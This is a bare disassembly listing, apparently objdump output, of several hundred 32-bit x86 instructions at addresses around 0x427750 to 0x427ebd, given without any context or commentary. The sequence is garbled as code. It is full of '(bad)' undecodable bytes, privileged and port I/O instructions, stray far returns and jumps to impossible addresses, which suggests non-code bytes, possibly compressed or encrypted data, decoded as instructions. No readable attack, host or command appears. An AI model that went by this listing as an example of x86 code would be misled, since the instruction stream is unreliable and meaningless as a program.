  42774d:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  427753:	inc    ebp
  427754:	cwde   
  427755:	mov    esi,DWORD PTR [edx]
  427757:	clc    
  427758:	mov    bl,al
  42775a:	xlat   BYTE PTR ds:[ebx]
  42775b:	retf   
  42775c:	inc    ebp
  42775d:	into   
  42775e:	mov    eax,esi
  427760:	in     al,dx
  427761:	scas   eax,DWORD PTR es:[edi]
  427762:	retf   
  427763:	mov    ecx,DWORD PTR [ebp-0x38]
  427766:	mov    edx,DWORD PTR [ebp-0x24]
  427769:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8868]
  427770:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  427777:	mov    eax,DWORD PTR [ebx]
  427779:	clc    
  42777a:	loopne 0x42773f
  42777c:	push   ebp
  42777d:	retf   
  42777e:	mov    dh,al
  427780:	adc    esi,ecx
  427782:	jb     0x427733
  427784:	add    BYTE PTR [ebx+0x558bc845],cl
  42778a:	in     al,dx
  42778b:	sub    eax,ebx
  42778d:	cmp    ecx,ebx
  42778f:	mov    eax,esi
  427791:	mov    esp,0x45af03ce
  427796:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  42779c:	mov    eax,ebx
  42779e:	in     al,dx
  42779f:	into   
  4277a0:	dec    ebp
  4277a1:	(bad)  
  4277a2:	xor    ebp,DWORD PTR [edi+0x80f8903]
  4277a8:	rol    DWORD PTR [ebp+0x4d],0x89
  4277ac:	xor    esp,esp
  4277ae:	sub    eax,DWORD PTR [ebp-0x75]
  4277b1:	add    ebp,esp
  4277b3:	mov    al,0x55
  4277b5:	inc    ebp
  4277b6:	xor    edi,DWORD PTR [eax]
  4277b8:	add    ebx,DWORD PTR [edi+ecx*1+0x55dcca89]
  4277bf:	inc    ebp
  4277c0:	xor    edi,DWORD PTR [ecx]
  4277c2:	sub    ebx,DWORD PTR [ebp+ecx*4+0x72c011c7]
  4277c9:	test   DWORD PTR [eax],eax
  4277cb:	clc    
  4277cc:	enter  0x8645,0x33
  4277d0:	inc    DWORD PTR [ebx]
  4277d2:	(bad)  
  4277d3:	jmp    0x42781a
  4277d5:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  4277db:	inc    ebp
  4277dc:	(bad)  
  4277dd:	mov    ebp,DWORD PTR [edi-0x277b7424]
  4277e3:	cwde   
  4277e4:	retf   
  4277e5:	xor    al,cl
  4277e7:	mov    BYTE PTR [ebp+0xb],cl
  4277ea:	lea    eax,[ebp+0x8]
  4277ed:	xor    esi,DWORD PTR [edx+0x3]
  4277f0:	add    al,ah
  4277f2:	inc    ebp
  4277f3:	dec    ebp
  4277f4:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  4277fa:	push   0x2b45cd00
  4277ff:	mov    al,BYTE PTR [ebx]
  427801:	or     esi,eax
  427803:	dec    ebp
  427804:	inc    ebp
  427805:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  42780b:	push   ebp
  42780c:	(bad)  
  42780d:	mov    BYTE PTR [edi+0xf723b11],ch
  427813:	add    ch,ch
  427815:	inc    ebp
  427816:	dec    DWORD PTR [ebx-0x34332775]
  42781c:	add    al,0x4d
  42781e:	inc    ebp
  42781f:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  427825:	cwde   
  427826:	add    DWORD PTR [edx],esi
  427828:	add    BYTE PTR [ebx+0x4d00c000],cl
  42782e:	push   DWORD PTR [ebx]
  427830:	int3   
  427831:	xor    eax,DWORD PTR [eax]
  427833:	add    edx,DWORD PTR [eax+0x3]
  427836:	mov    DWORD PTR [edi],ecx
  427838:	call   0x428838fe
  42783d:	mov    DWORD PTR [ebp-0x20],esp
  427840:	add    BYTE PTR [ebp+0x7d],al
  427843:	mov    eax,DWORD PTR [eax]
  427845:	in     al,0x15
  427847:	ret    
  427848:	iret   
  427849:	(bad)  
  42784a:	enter  0x14af,0x8b
  42784e:	(bad)  
  42784f:	in     al,dx
  427850:	or     bl,cl
  427852:	adc    cl,al
  427854:	push   ebp
  427855:	dec    ebp
  427856:	inc    eax
  427857:	mov    edx,DWORD PTR [ebp-0x20]
  42785a:	jb     0x427827
  42785c:	mov    ecx,esi
  42785e:	cld    
  42785f:	scas   eax,DWORD PTR es:[edi]
  427860:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  427867:	mov    BYTE PTR [eax],0x8c
  42786a:	push   0xffffff98
  42786c:	push   edi
  42786d:	xor    dl,BYTE PTR [eax+0x3b]
  427870:	mov    ecx,DWORD PTR [edi]
  427872:	call   0x8c41bdd5
  427877:	mov    eax,eax
  427879:	in     al,dx
  42787a:	jge    0x4278c9
  42787c:	mov    DWORD PTR [ebx],esi
  42787e:	int3   
  42787f:	add    eax,DWORD PTR [ebp+0xf]
  427882:	xor    eax,ecx
  427884:	(bad)  
  427885:	dec    ebp
  427886:	pushf  
  427887:	xor    ecx,eax
  427889:	add    edi,DWORD PTR [edi]
  42788b:	mov    eax,DWORD PTR [ebp-0x38]
  42788e:	rol    BYTE PTR [eax+edx*8-0x14cdfc68],1
  427895:	mov    DWORD PTR [edx+0xf4505c8],ecx
  42789b:	xor    edx,DWORD PTR [ecx+edi*4]
  42789e:	or     BYTE PTR [ebp-0x371600bd],0xf
  4278a5:	dec    ebp
  4278a6:	leave  
  4278a7:	mov    edx,ecx
  4278a9:	rol    BYTE PTR [ebp+0x330155],1
  4278af:	add    ecx,DWORD PTR [ebp+0xf]
  4278b2:	xor    eax,edx
  4278b4:	(bad)  
  4278b5:	ror    DWORD PTR [eax],0x86
  4278b8:	jb     0x4278b7
  4278ba:	add    bh,bh
  4278bc:	clc    
  4278bd:	inc    ebp
  4278be:	jb     0x42792a
  4278c0:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  4278c6:	cmp    BYTE PTR [ebx+0xc7d89c],cl
  4278cc:	shr    BYTE PTR [eax-0x3d],0x30
  4278d0:	clc    
  4278d1:	add    BYTE PTR [ebp+0x75],al
  4278d4:	cmp    BYTE PTR [edx-0x64],ch
  4278d7:	inc    edi
  4278d9:	adc    al,0xe8
  4278db:	inc    ebp
  4278dc:	test   DWORD PTR [ebp-0x7cba8b08],eax
  4278e2:	mov    ecx,DWORD PTR [eax]
  4278e4:	cld    
  4278e5:	or     DWORD PTR [ebp-0x34],0x33
  4278e9:	jbe    0x4278ee
  4278eb:	mov    edx,DWORD PTR [ecx+0x2b]
  4278ee:	dec    ebp
  4278ef:	mov    cl,BYTE PTR [ebx+0x45d801]
  4278f5:	mov    BYTE PTR [ebx],dh
  4278f7:	mov    eax,DWORD PTR [ebx]
  4278f9:	or     BYTE PTR [ecx+0x3b],dl
  4278fc:	dec    ebp
  4278fd:	int3   
  4278fe:	xor    ebp,edi
  427900:	add    eax,DWORD PTR [ebp+0x51]
  427903:	mov    ecx,DWORD PTR [ebp-0x28]
  427906:	xor    eax,DWORD PTR [eax]
  427908:	add    ebp,DWORD PTR [eax+0x51]
  42790b:	adc    BYTE PTR [eax+0x0],0x8b
  42790f:	add    BYTE PTR [ebx+0x4d18fcff],cl
  427915:	inc    ebp
  427916:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  42791c:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  427922:	dec    ebp
  427923:	mov    esi,DWORD PTR [ebx]
  427925:	hlt    
  427926:	add    eax,ebx
  427928:	push   ecx
  427929:	inc    ebp
  42792a:	dec    ebp
  42792b:	sar    bh,1
  42792d:	shl    ah,1
  42792f:	(bad)  
  427930:	retf   
  427931:	mov    al,ds:0xc5ff3dce
  427936:	adc    al,0xc6
  427938:	inc    ebp
  427939:	and    eax,0x9c0f4c85
  42793e:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  427945:	cmp    BYTE PTR [ebx+0x3b],0x0
  427949:	mov    dh,0xc7
  42794b:	cmp    eax,eax
  42794d:	jne    0x45437199
  427953:	mov    edi,DWORD PTR [edx]
  427955:	mov    eax,0x848bcb9c
  42795a:	rcr    BYTE PTR [eax-0x7c7fcd0f],0x68
  427961:	or     BYTE PTR [edi],cl
  427963:	(bad)  
  427964:	dec    ebp
  427965:	inc    edi
  427966:	add    bh,0x50
  427969:	or     cl,ch
  42796b:	test   DWORD PTR [eax+0x4d4501f8],ecx
  427971:	xchg   DWORD PTR [eax-0x1638af64],eax
  427977:	mov    esp,0xf802b588
  42797c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42797d:	inc    ebp
  42797e:	(bad)  
  42797f:	cmp    al,0xff
  427981:	pushf  
  427982:	or     DWORD PTR [ecx+0x45ffe474],0x0
  427989:	mov    ecx,DWORD PTR [ebp-0x340018]
  42798f:	into   
  427990:	dec    DWORD PTR [ebx-0x7f72431c]
  427996:	push   0x5000ff01
  42799b:	retf   
  42799c:	inc    ebp
  42799d:	into   
  42799e:	dec    DWORD PTR [ebx-0x343f3ff4]
  4279a4:	push   eax
  4279a5:	into   
  4279a6:	call   0x4a7e36
  4279ab:	retf   
  4279ac:	add    dh,cl
  4279ae:	add    bh,bh
  4279b0:	mov    DWORD PTR [eax+ecx*1],edx
  4279b3:	clc    
  4279b4:	inc    ebp
  4279b5:	inc    ebp
  4279b6:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  4279bc:	push   0x1
  4279be:	push   edi
  4279bf:	add    BYTE PTR [eax-0x35],dl
  4279c2:	mov    ecx,esi
  4279c4:	cld    
  4279c5:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  4279cb:	into   
  4279cc:	ror    BYTE PTR [ebx+0x75000800],0x50
  4279d3:	xor    eax,DWORD PTR [ebp+0x3]
  4279d6:	jne    0x427a29
  4279d8:	call   DWORD PTR [eax-0x3c]
  4279db:	mov    DWORD PTR [ecx-0x18],edx
  4279de:	mov    edi,edi
  4279e0:	call   0x8b45bf69
  4279e5:	add    ah,ah
  4279e7:	rol    BYTE PTR [ebp-0x7c],0xeb
  4279eb:	add    edi,edi
  4279ed:	add    al,ch
  4279ef:	inc    ebp
  4279f0:	push   ecx
  4279f1:	cmp    ecx,DWORD PTR [ebx+0x45c7c49c]
  4279f7:	mov    al,0xc7
  4279f9:	test   esp,esp
  4279fb:	clc    
  4279fc:	test   DWORD PTR [ebp-0x8],ecx
  4279ff:	add    BYTE PTR [ebp+0x50],0x39
  427a03:	jmp    0x8bcc02a4
  427a08:	in     al,dx
  427a09:	or     BYTE PTR [ebp-0xf],al
  427a0c:	xor    eax,DWORD PTR [eax+0x4f896803]
  427a12:	hlt    
  427a13:	mov    eax,DWORD PTR [ebp-0x50]
  427a16:	xor    esi,ecx
  427a18:	add    eax,DWORD PTR [eax+0x4f086889]
  427a1e:	inc    ebp
  427a1f:	sbb    eax,0x68
  427a22:	pushf  
  427a23:	inc    edi
  427a25:	add    al,ch
  427a27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427a28:	test   edi,edi
  427a2a:	clc    
  427a2b:	inc    DWORD PTR [ebp-0x73]
  427a2e:	cmp    esi,DWORD PTR [esp+ebx*4-0x1]
  427a32:	(bad)  
  427a33:	push   ecx
  427a34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a35:	jne    0x4279bc
  427a37:	push   eax
  427a38:	clc    
  427a39:	test   DWORD PTR [ebp-0x1],eax
  427a3c:	cmp    eax,0xc78b9cff
  427a41:	les    esi,FWORD PTR [eax+esi*2+0x10f88385]
  427a48:	inc    ebp
  427a49:	push   edi
  427a4a:	aas    
  427a4b:	sbb    bl,BYTE PTR [eax+eax*1-0x7f1b9775]
  427a52:	dec    ebp
  427a53:	add    BYTE PTR [ebx],dh
  427a55:	inc    ebp
  427a56:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  427a5c:	enter  0x8401,0x0
  427a60:	add    al,BYTE PTR [eax]
  427a62:	add    bh,bh
  427a64:	out    dx,eax
  427a65:	sbb    BYTE PTR [eax],al
  427a67:	dec    ebp
  427a68:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  427a6e:	sub    esi,DWORD PTR [ebx]
  427a70:	mov    ebp,DWORD PTR [eax-0x8]
  427a73:	add    bl,0x0
  427a76:	(bad)  
  427a77:	cmp    eax,ecx
  427a79:	or     BYTE PTR [edx+0x750114],al
  427a7f:	inc    DWORD PTR [ebp+0x18]
  427a82:	mov    eax,DWORD PTR [ebp-0x8]
  427a85:	mov    ebx,eax
  427a87:	(bad)  
  427a88:	retf   
  427a89:	inc    ebp
  427a8a:	into   
  427a8b:	mov    esi,eax
  427a8d:	int3   
  427a8e:	scas   eax,DWORD PTR es:[edi]
  427a8f:	push   es
  427a90:	mov    esi,DWORD PTR [ebp-0xc]
  427a93:	call   DWORD PTR [ebp+0x18]
  427a96:	sub    edi,DWORD PTR [ebp+0x3b]
  427a99:	mov    esi,DWORD PTR [edi-0x34]
  427a9c:	mov    eax,DWORD PTR [ebp-0x8]
  427a9f:	cmp    bl,al
  427aa1:	pushf  
  427aa2:	mov    bh,0xbc
  427aa5:	fadd   QWORD PTR [eax]
  427aa7:	test   DWORD PTR [ebx+0x4d45bcf8],ecx
  427aad:	mov    esi,DWORD PTR [ebx]
  427aaf:	in     al,0x33
  427ab1:	ret    
  427ab2:	add    eax,esi
  427ab4:	add    eax,DWORD PTR [ebp+0xf]
  427ab7:	mov    eax,ecx
  427ab9:	in     al,0x4d
  427abb:	ret    
  427abc:	mov    eax,esi
  427abe:	in     al,dx
  427abf:	inc    ebp
  427ac0:	rol    edi,1
  427ac2:	sar    al,1
  427ac4:	or     BYTE PTR [ebp+0x45e9f845],al
  427aca:	add    BYTE PTR [edx],bh
  427acc:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  427ad3:	test   ebx,eax
  427ad5:	clc    
  427ad6:	retf   
  427ad7:	inc    ebp
  427ad8:	into   
  427ad9:	cmp    al,0xc6
  427adb:	pushf  
  427adc:	scas   eax,DWORD PTR es:[edi]
  427add:	(bad)  
  427ade:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  427ae5:	inc    ebp
  427ae6:	cmp    edi,DWORD PTR [esi]
  427ae8:	ja     0x427a86
  427aea:	mov    eax,edi
  427aec:	mov    esp,0x458567a8
  427af1:	clc    
  427af2:	mov    eax,DWORD PTR [ebp-0x8]
  427af5:	mov    eax,ebx
  427af7:	in     al,dx
  427af8:	retf   
  427af9:	ret    
  427afa:	into   
  427afb:	mov    dh,0x7d
  427afe:	scas   eax,DWORD PTR es:[edi]
  427aff:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  427b05:	add    BYTE PTR [ebx],ch
  427b07:	jmp    0xb97c47
  427b0c:	mov    eax,DWORD PTR [ebp-0x5c]
  427b0f:	mov    eax,DWORD PTR [ebp-0x14]
  427b12:	inc    ebp
  427b13:	enter  0x458b,0xf8
  427b17:	xor    eax,ebx
  427b19:	add    ecx,ebx
  427b1b:	cmp    ecx,esi
  427b1d:	shufps xmm7,xmm4,0xaf
  427b21:	add    BYTE PTR [ebx+0x55e8f48b],cl
  427b27:	dec    ebp
  427b28:	sub    esi,DWORD PTR [ebx]
  427b2a:	cmp    esi,DWORD PTR [ebx]
  427b2c:	ja     0x427b31
  427b2e:	mov    eax,DWORD PTR [ebx]
  427b30:	lods   al,BYTE PTR ds:[esi]
  427b31:	mov    db0,ecx
  427b34:	inc    ebp
  427b35:	dec    ebp
  427b36:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  427b3c:	retf   
  427b3d:	rol    dh,1
  427b3f:	or     al,0xce
  427b41:	inc    ebp
  427b42:	scas   eax,DWORD PTR es:[edi]
  427b43:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  427b49:	add    BYTE PTR [ebx],ch
  427b4b:	add    BYTE PTR [ebx],bh
  427b4d:	inc    ebp
  427b4e:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  427b54:	inc    ebp
  427b55:	retf   
  427b56:	mov    ecx,esi
  427b58:	clc    
  427b59:	(bad)  
  427b5a:	retf   
  427b5b:	scas   eax,DWORD PTR es:[edi]
  427b5c:	ret    
  427b5d:	mov    ecx,esi
  427b5f:	hlt    
  427b60:	(bad)  
  427b61:	push   ebp
  427b62:	scas   eax,DWORD PTR es:[edi]
  427b63:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  427b69:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  427b6f:	add    BYTE PTR [ebx],al
  427b71:	mov    eax,eax
  427b73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427b74:	inc    ebp
  427b75:	dec    ebp
  427b76:	cmp    BYTE PTR [ebx],dh
  427b78:	pushf  
  427b79:	xor    ecx,DWORD PTR [ecx+0x4503d003]
  427b7f:	(bad)  
  427b81:	rcr    DWORD PTR [ebp+ecx*2-0x134f7439],0x85
  427b89:	sar    eax,1
  427b8b:	rol    BYTE PTR [ebp+0x5],1
  427b8e:	xor    eax,DWORD PTR [ebp+0x3]
  427b91:	jmp    0x427b7e
  427b93:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  427b99:	xor    eax,DWORD PTR [ebp+0x33]
  427b9c:	mov    eax,DWORD PTR [ebx]
  427b9e:	rol    BYTE PTR [ebx],1
  427ba0:	test   BYTE PTR [edi],cl
  427ba2:	cwde   
  427ba3:	shl    DWORD PTR [edx],0x4d
  427ba6:	mov    BYTE PTR [ebx-0x2eba13f5],cl
  427bac:	xor    edx,eax
  427bae:	add    eax,DWORD PTR ds:0xeb4d45e0
  427bb4:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  427bba:	add    BYTE PTR [ebx],dh
  427bbc:	inc    ebp
  427bbd:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  427bc3:	rdpmc  
  427bc5:	rol    DWORD PTR [ebx],0x4d
  427bc8:	loopne 0x427b55
  427bca:	push   ebp
  427bcb:	in     al,dx
  427bcc:	mov    cl,dl
  427bce:	adc    eax,edx
  427bd0:	jb     0x427bd7
  427bd2:	add    BYTE PTR [ebp+0x45],al
  427bd5:	jmp    0x427b62
  427bd7:	mov    ebx,eax
  427bd9:	test   al,0xcb
  427bdb:	dec    ebp
  427bdc:	dec    ebp
  427bdd:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  427be3:	add    ebx,DWORD PTR [eax-0x743ecdf1]
  427be9:	dec    ebp
  427bea:	mov    al,0x8b
  427bec:	dec    ebp
  427bed:	in     al,dx
  427bee:	xor    edx,ecx
  427bf0:	xor    edx,eax
  427bf2:	add    eax,DWORD PTR [ebp+0x3]
  427bf5:	jbe    0x427c06
  427bf7:	mov    eax,ecx
  427bf9:	test   al,0x45
  427bfb:	dec    ebp
  427bfc:	mov    DWORD PTR [ebx],esi
  427bfe:	loopne 0x427c33
  427c00:	inc    ebp
  427c01:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  427c07:	rol    esi,0x45
  427c0a:	scas   eax,DWORD PTR es:[edi]
  427c0b:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  427c11:	mov    eax,ecx
  427c13:	hlt    
  427c14:	dec    ebp
  427c15:	inc    ebp
  427c16:	mov    eax,edi
  427c18:	loopne 0x427bf2
  427c1a:	retf   
  427c1b:	test   esi,ecx
  427c1d:	clc    
  427c1e:	scas   eax,DWORD PTR es:[edi]
  427c1f:	inc    ebp
  427c20:	mov    eax,edi
  427c22:	fdiv   st,st(0)
  427c24:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  427c2a:	cwde   
  427c2b:	cmp    dh,BYTE PTR [edx]
  427c2d:	pushf  
  427c2e:	cmp    ecx,DWORD PTR [ebx-0x3ca127f1]
  427c34:	inc    esi
  427c36:	mov    ebp,DWORD PTR [eax-0x10]
  427c39:	inc    ebp
  427c3a:	dec    ebp
  427c3b:	xor    esi,DWORD PTR [ebx]
  427c3d:	add    eax,DWORD PTR [ebx]
  427c3f:	loopne 0x427c50
  427c41:	dec    ebp
  427c42:	ror    DWORD PTR [edx+0x7233084d],0x3
  427c49:	add    BYTE PTR [ebx-0x7b740bbb],cl
  427c4f:	lock cwde 
  427c51:	ret    
  427c52:	xor    al,BYTE PTR [ebp-0x77]
  427c55:	mov    esi,esp
  427c57:	rol    BYTE PTR [ebp-0x7c],1
  427c5a:	xor    ebx,DWORD PTR [eax-0x7772cd47]
  427c60:	call   edi
  427c62:	enter  0x4d45,0x8b
  427c66:	mov    esi,eax
  427c68:	fmul   st(3),st
  427c6a:	push   ebp
  427c6b:	dec    ebp
  427c6c:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  427c72:	ret    0xc198
  427c75:	xor    al,BYTE PTR [esi-0x280276]
  427c7b:	dec    ebp
  427c7c:	jne    0x427cb1
  427c7e:	mov    eax,DWORD PTR [ebx]
  427c80:	cld    
  427c81:	loopne 0x427c33
  427c83:	push   ebp
  427c84:	add    DWORD PTR [eax+0x72851100],ecx
  427c8a:	inc    DWORD PTR [eax]
  427c8c:	inc    DWORD PTR [ebp-0x75]
  427c8f:	mov    edi,esp
  427c91:	lock add bl,0x1
  427c95:	retf   
  427c96:	add    dh,al
  427c98:	xor    dh,cl
  427c9a:	inc    ebp
  427c9b:	scas   eax,DWORD PTR es:[edi]
  427c9c:	mov    eax,DWORD PTR [ebx]
  427c9e:	shl    al,0x0
  427ca1:	inc    ebp
  427ca2:	dec    DWORD PTR [ebx+0x4dccf0ff]
  427ca8:	call   0x458ee0
  427cad:	ud0    eax,ecx
  427cb0:	adc    al,0x4d
  427cb2:	inc    ebp
  427cb3:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  427cb9:	lock push 0x338055
  427cbf:	add    eax,DWORD PTR [eax]
  427cc1:	ud0    ecx,edx
  427cc4:	sbb    BYTE PTR [ebp+0x5e],dl
  427cc7:	xor    ecx,ecx
  427cc9:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  427cd0:	push   ecx
  427cd1:	add    BYTE PTR [ebp-0x38],cl
  427cd4:	mov    DWORD PTR [esi-0x740004],eax
  427cda:	cld    
  427cdb:	inc    ebp
  427cdc:	xchg   edx,eax
  427cdd:	mov    ecx,DWORD PTR [ebx-0x743c761c]
  427ce3:	xabort 0xaf
  427ce6:	icebp  
  427ce7:	mov    esi,DWORD PTR [ebp-0x28]
  427cea:	(bad)  
  427ceb:	retf   
  427cec:	or     ecx,eax
  427cee:	(bad)  
  427cef:	dec    ebp
  427cf0:	pop    es
  427cf1:	(bad)  
  427cf2:	(bad)  
  427cf3:	or     BYTE PTR [esi],al
  427cf5:	jb     0x427cbd
  427cf7:	add    BYTE PTR [ebx],al
  427cf9:	inc    ebp
  427cfa:	(bad)  
  427cfb:	mov    ecx,DWORD PTR [edx]
  427cfd:	fadd   st(6),st
  427cff:	ret    
  427d00:	add    ch,BYTE PTR [eax-0x37]
  427d03:	int    0x55
  427d05:	sub    ebp,esp
  427d07:	add    edx,DWORD PTR [ecx-0x14]
  427d0a:	inc    ebp
  427d0b:	inc    ebp
  427d0c:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  427d12:	cld    
  427d13:	(bad)  
  427d14:	mov    gs,WORD PTR [edi+0xf893be0]
  427d1a:	mov    ebp,ebp
  427d1c:	clc    
  427d1d:	push   eax
  427d1f:	push   DWORD PTR [ebp-0x4]
  427d22:	mov    BYTE PTR [ebp+0xa],0xff
  427d26:	(bad)  
  427d27:	int3   
  427d28:	or     BYTE PTR [eax],al
  427d2a:	(bad)  
  427d2b:	lea    eax,[edi]
  427d2d:	ins    BYTE PTR es:[edi],dx
  427d2e:	(bad)  
  427d2f:	inc    DWORD PTR [ecx]
  427d31:	push   eax
  427d32:	mov    BYTE PTR [ebp+0x9],0x8b
  427d36:	leave  
  427d37:	les    edx,FWORD PTR [ebp+0x0]
  427d3a:	in     al,dx
  427d3b:	call   DWORD PTR [ecx-0x75]
  427d3e:	inc    ebp
  427d3f:	cld    
  427d40:	mov    DWORD PTR [eax+0x8b01fc],eax
  427d46:	cld    
  427d47:	xor    BYTE PTR [edi-0x76a8f98b],bh
  427d4d:	std    
  427d4e:	mov    eax,DWORD PTR [eax]
  427d50:	clc    
  427d51:	test   eax,esi
  427d53:	je     0x427dca
  427d55:	mov    eax,esi
  427d57:	cld    
  427d58:	add    al,0x80
  427d5a:	add    WORD PTR [ecx+0x0],ax
  427d5e:	fadd   QWORD PTR [eax]
  427d60:	mov    BYTE PTR [eax],0xd0
  427d63:	push   0xffffffc3
  427d65:	push   edi
  427d66:	mov    edx,DWORD PTR [eax+0x51]
  427d69:	pop    edi
  427d6a:	lea    ebx,[ebx-0x8]
  427d6d:	ret    0x45
  427d70:	mov    ecx,DWORD PTR [ebx-0x7241ae04]
  427d76:	xchg   eax,edi
  427d78:	mov    DWORD PTR [ebp-0x75],ecx
  427d7b:	push   esi
  427d7c:	clc    
  427d7d:	jne    0x427d4f
  427d7f:	mov    ecx,0xf8450b0b
  427d84:	(bad)  
  427d85:	push   cs
  427d86:	or     BYTE PTR [ebp-0x3a],dh
  427d89:	cmp    eax,DWORD PTR [ecx]
  427d8b:	pop    esi
  427d8c:	(bad)  
  427d8d:	or     al,0x5
  427d8f:	inc    eax
  427d90:	leave  
  427d91:	in     al,dx
  427d92:	add    al,0x42
  427d94:	push   esi
  427d95:	and    eax,0xedc940cf
  427d9a:	inc    DWORD PTR [eax-0x75]
  427d9d:	fmul   QWORD PTR [ebx-0xf8739be]
  427da3:	inc    eax
  427da4:	nop
  427da5:	jmp    0x518b:0x8b8bc3ff
  427dac:	(bad)  
  427dad:	lea    eax,ds:0xff45e8f8
  427db3:	push   esi
  427db4:	push   DWORD PTR [ebp-0x39]
  427db7:	mov    eax,0x7edda46
  427dbc:	or     al,0x6
  427dbe:	push   DWORD PTR [ebp-0x3a]
  427dc1:	cmp    eax,DWORD PTR [edx]
  427dc3:	pop    esi
  427dc4:	ret    
  427dc5:	or     al,0x56
  427dc7:	inc    ecx
  427dc8:	push   ebp
  427dc9:	js     0x427db7
  427dcb:	inc    edx
  427dcc:	inc    ebp
  427dcd:	int    0x1
  427dcf:	inc    ecx
  427dd0:	sub    BYTE PTR ds:0xe77541fc,ah
  427dd6:	add    DWORD PTR [edx+0x1c],eax
  427dd9:	int3   
  427dda:	mov    eax,ebx
  427ddc:	adc    al,0x8b
  427dde:	xchg   edx,eax
  427ddf:	push   ecx
  427de0:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  427de6:	rcl    DWORD PTR [esi-0x9],cl
  427de9:	jne    0x427e3b
  427deb:	mov    eax,0x7c80ece
  427df0:	rol    DWORD PTR [esi],cl
  427df2:	div    DWORD PTR [ebp+0x50]
  427df5:	cmp    ecx,edx
  427df7:	pop    esi
  427df8:	dec    BYTE PTR [edx]
  427dfa:	in     al,dx
  427dfb:	inc    edx
  427dfc:	sub    ebp,ecx
  427dfe:	inc    eax
  427dff:	(bad)  
  427e00:	push   eax
  427e01:	add    edx,DWORD PTR [eax-0x17]
  427e04:	push   edi
  427e05:	add    dh,dh
  427e07:	leave  
  427e08:	adc    DWORD PTR [ebp-0x1],0xffffffec
  427e0c:	add    BYTE PTR [ecx+0x0],dl
  427e0f:	inc    ebp
  427e10:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  427e16:	add    BYTE PTR [eax-0x7fbf448],bh
  427e1c:	add    al,0x2
  427e1e:	jmp    0x57e2978
  427e23:	jne    0x427e0d
  427e25:	mov    eax,DWORD PTR [edx]
  427e27:	or     BYTE PTR [eax],al
  427e29:	inc    ecx
  427e2a:	stc    
  427e2b:	in     eax,dx
  427e2c:	ss inc eax
  427e2e:	aas    
  427e2f:	out    0x7d,eax
  427e31:	inc    ecx
  427e32:	mov    esi,ecx
  427e34:	lock ret 0x7d
  427e38:	and    ecx,DWORD PTR [ebx-0x171777]
  427e3e:	add    bh,bh
  427e40:	aad    0xd7
  427e42:	add    dh,cl
  427e44:	clts   
  427e46:	(bad)  
  427e47:	call   0xffcd7d4c
  427e4c:	hlt    
  427e4d:	iret   
  427e4e:	jge    0x427e26
  427e50:	rol    DWORD PTR [esi-0x80],cl
  427e53:	icebp  
  427e54:	or     BYTE PTR [edi-0x27],cl
  427e57:	(bad)  
  427e58:	out    dx,al
  427e59:	mov    eax,DWORD PTR [ebx]
  427e5b:	(bad)  
  427e5c:	pop    esi
  427e5d:	push   es
  427e5e:	cmp    al,0xe8
  427e60:	sar    edi,0x8
  427e63:	inc    DWORD PTR [edi]
  427e65:	inc    esi
  427e66:	(bad)  
  427e67:	jmp    0x8b00:0x530e577e
  427e6e:	push   esi
  427e6f:	mov    eax,DWORD PTR [eax]
  427e71:	and    al,0x0
  427e73:	inc    ebp
  427e74:	push   eax
  427e75:	push   eax
  427e76:	add    DWORD PTR [ebx+0x757d1834],ecx
  427e7c:	sub    edx,DWORD PTR [esi-0x24]
  427e7f:	jne    0x427e37
  427e81:	lods   eax,DWORD PTR ds:[esi]
  427e82:	mov    edx,DWORD PTR [edx-0x34]
  427e85:	dec    esi
  427e86:	out    0x83,eax
  427e88:	into   
  427e89:	push   edi
  427e8b:	loopne 0x427e5b
  427e8d:	shr    BYTE PTR [edx+ecx*4+0x0],1
  427e91:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  427e98:	rol    DWORD PTR [edx],0x8
  427e9b:	mov    esp,ecx
  427e9d:	cmp    DWORD PTR [ebx],0xc
  427ea0:	mov    esi,0x5001c0
  427ea5:	push   eax
  427ea6:	push   cs
  427ea7:	push   eax
  427ea8:	(bad)  
  427ea9:	sub    edx,edi
  427eab:	push   esi
  427eac:	adc    al,0xcb
  427eae:	ins    DWORD PTR es:[edi],dx
  427eaf:	mov    eax,0x203e8
  427eb4:	add    al,ah
  427eb6:	ror    BYTE PTR [eax+0xc007c0],0xc0
  427ebd:	add    dh,al
